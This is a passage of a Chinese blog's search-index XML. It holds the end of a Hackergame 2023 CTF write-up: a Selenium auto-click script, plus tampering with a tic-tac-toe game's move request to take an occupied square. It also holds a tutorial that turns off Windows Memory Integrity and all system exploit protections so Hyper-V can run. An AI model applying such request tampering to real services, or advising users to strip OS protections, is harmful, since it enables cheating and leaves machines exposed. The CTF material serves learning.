class="hljs-keyword">import</span> Keys<br><span class="hljs-keyword">import</span> time<br><br><br>options = Options()<br>options.set_capability(<span class="hljs-string">&quot;ms:edgeChrominum&quot;</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>options.add_experimental_option(<span class="hljs-string">&quot;detach&quot;</span>, <span class="hljs-literal">True</span>)<br>driver = webdriver.Edge(options=options)<br>driver.get(<span class="hljs-string">r&#x27;http://202.38.93.111:10021/&#x27;</span>)<br>tk = driver.find_element(By.NAME,<span class="hljs-string">&#x27;token&#x27;</span>)<br>tk.clear()<br>tk.send_keys(<span class="hljs-string">&quot;...&quot;</span>)<span class="hljs-comment">#自己的Token</span><br>tk.send_keys(Keys.ENTER)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element(By.XPATH,<span class="hljs-string">&#x27;//span[contains(text(),&quot;hack[&quot;) and contains(text(),&quot;]&quot;)]&#x27;</span>).click()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span>       <br></code></pre></td></tr></table></figure><p>需要注意：使用<code>//span[contains(text(),&quot;hack[&quot;) and contains(text(),&quot;]&quot;)]</code>这个表达式可能会点击错误的消息，但是作者使用的浏览器不支持XPath 2.0，无法使用XPath matches（正则表达式匹配）。<strong>因此这也算是一个误打误撞出来的非预期解。</strong>如果出现误撤回的情况，可以重新进入题目。</p><p><del>经验教训：不要随意点击鼠标。</del></p><p>建议提前准备屏幕录制<del>（别问作者是怎么知道的）</del>并逐帧分析捕获flag：</p><p><img src="/Hackergame2023_WP/image-20231029135002286.png" alt="image-20231029135002286" style="zoom: 50%;"></p><h3 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h3><h4 id="题目描述：-18"><a href="#题目描述：-18" class="headerlink" title="题目描述："></a>题目描述：</h4><p>那一年的人机大战，是 AlphaGo 对阵柯洁，最终比分 3-0。当时我看见柯洁颓坐在椅子上泣不成声，这个画面我永生难忘。那一刻我在想，如果我能成为一名棋手，我一定要赢下人工智能。如今 AI 就在眼前，我必须考虑这会不会是我此生仅有的机会。重铸人类围棋荣光，我辈义不容辞！</p><p>……</p><p>但是围棋实在太难了，你决定先从井字棋开始练习。</p><h4 id="题解：-15"><a href="#题解：-15" class="headerlink" title="题解："></a>题解：</h4><p>页面其貌不扬，只好拦截请求看看了。尝试放下第一颗棋子，发现请求体带了坐标。</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(173).png" alt="屏幕截图(173)" style="zoom: 25%;"></p><p>放下第二颗棋子，它右边的格子已经被AI占了。粗暴点击是行不通的，不过可以修改请求体。</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(174)-16985695036033.png" style="zoom:25%;"></p><p>获得flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(175).png" alt="屏幕截图(175)" style="zoom:25%;"></p>]]></content>
    
    
    <categories>
      
      <category>CTF-Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Hackergame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【续集】在关闭HVCI的情况下使用Hyper-V</title>
    <link href="/HV_without_HVCI/"/>
    <url>/HV_without_HVCI/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-前情提要"><a href="#0-前情提要" class="headerlink" title="0.前情提要"></a>0.前情提要</h1><p>其实这篇攻略很早就做完了，只是因为Hyper-V VID驱动无法启动而一直没发(<del>M$写的什么咖喱</del>)。</p><p>上一篇攻略<a href="https://www.bilibili.com/read/cv22719638/?spm_id_from=333.999.0.0">《如何科学地关闭VBS并与Windows Subsystem全家桶共存》</a>发布后，还是收获了一定的浏览量（草根up不容易:-(），并被转载到站外。但是当时采用的方案不仅操作繁琐，而且存在缺陷——<strong>只适用于下一次引导</strong>，一旦重启，则VBS&#x2F;HVCI又会死灰复燃。这篇文章的思路则是——不完全关闭HVCI，但把它限制在需要的应用上。</p><p><u><strong>重要：继续阅读本文表明读者已经知晓并愿意承担因安全特性缺失引起的风险。</strong></u></p><p><u><strong>重要：继续阅读本文表明读者已经知晓并愿意承担因安全特性缺失引起的风险。</strong></u></p><p><u><strong>重要：继续阅读本文表明读者已经知晓并愿意承担因安全特性缺失引起的风险。</strong></u></p><h1 id="1-操作方法"><a href="#1-操作方法" class="headerlink" title="1.操作方法"></a>1.操作方法</h1><p>该方法适用于Windows 10 1803及之后的所有Windows版本，本文以Windows 11 22H2为例进行讲解。如果你需要WSL、Hyper-V、Windows沙盒等功能但尚未开启，请前往“控制面板-程序和功能-打开或关闭Windows功能”开启。</p><p><u><strong>重要：如果你不知道每一步操作要干什么，请不要继续。</strong></u></p><p><u><strong>重要：如果你不知道每一步操作要干什么，请不要继续。</strong></u></p><p><u><strong>重要：如果你不知道每一步操作要干什么，请不要继续。</strong></u></p><h2 id="步骤1：关闭全局设置"><a href="#步骤1：关闭全局设置" class="headerlink" title="步骤1：关闭全局设置"></a>步骤1：关闭全局设置</h2><p>可以直接使用<code>Windows徽标+S</code>组合键，搜索“安全中心”并打开，随后转到“设备安全性-内核隔离-内核隔离详细信息”，关闭“内存完整性”。</p><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(9).png" alt="屏幕截图(9)" style="zoom:50%;"><p>转到“应用和浏览器控制-攻击防护-攻击防护设置-系统设置”，把所有选项全部改为“默认关闭”，并重启设备。</p><p>*部分系统版本中，“攻击防护”可能被称作“Exploit Protection”</p><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(10).png" alt="屏幕截图(10)" style="zoom:50%;"><h2 id="步骤2：添加白名单"><a href="#步骤2：添加白名单" class="headerlink" title="步骤2：添加白名单"></a>步骤2：添加白名单</h2><p>设备重启后，转到“Windows安全中心-应用和浏览器控制-攻击防护-攻击防护设置-程序设置”，点击“添加程序进行自定义-选择准确的文件路径”，添加<code>C:\\Windows\System32\vmcompute.exe</code>，打开“控制流保护”。</p><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(12).png" alt="屏幕截图(12)" style="zoom: 50%;"><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(13).png" alt="屏幕截图(13)" style="zoom: 50%;"><p>如果你需要使用Windows Subsystem for Android，那么需要给<code>wsaclient.exe</code>添加白名单。但是由于Windows商店应用所在的<code>C:\\Program Files\WindowsApps</code>目录权限控制严格<strong>（永远不要尝试通过”安全“选项卡的ACL更改该目录或子目录&#x2F;文件的访问权限和所有者，否则商店应用将无法启动!!!）</strong>，需要使用Everything(<a href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">Windows(x86-64体系结构)点此下载</a>)搜索<code>wsaclient.exe</code>并右击打开其路径（文件信息如下所示），然后复制到”程序设置“的选框内。如果提示缺少权限，请根据弹窗提示授权。</p><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(14).png" alt="屏幕截图(14)" style="zoom:50%;"><p><code>wsaclient.exe</code>的白名单设置如下：</p><img src="/2023/09/26/HV_without_HVCI/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(15).png" alt="屏幕截图(15)" style="zoom:50%;"><h2 id="步骤3：启动Hyper-V服务"><a href="#步骤3：启动Hyper-V服务" class="headerlink" title="步骤3：启动Hyper-V服务"></a>步骤3：启动Hyper-V服务</h2><p>使用<code>Windows徽标+S</code>组合键，搜索“Services”并打开，将“Hyper-V主机计算服务”的启动类型设为“自动”，然后启动此服务。</p><p>经过上述操作后，Hyper-V相关服务应能正常运行。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
